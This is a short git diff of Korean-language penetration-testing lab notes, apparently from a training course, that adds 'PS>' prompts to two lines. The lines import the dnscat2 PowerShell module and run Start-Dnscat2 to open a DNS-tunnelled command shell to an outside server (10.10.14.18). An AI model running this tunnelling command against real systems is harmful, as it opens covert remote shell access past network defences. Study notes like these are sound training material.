@@ -245,8 +245,8 @@ sudo bundle install
 ```git clone https://github.com/lukebaggett/dnscat2-powershell.git```
 
 ### dnscat2.ps1을 통해 터널 설정
-```Import-Module .\dnscat2.ps1```
-```Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd```
+```PS> Import-Module .\dnscat2.ps1```<br/>
+```PS> Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd```
 
 ### dnscat2 옵션 목록
 ```dnscat2> ?```
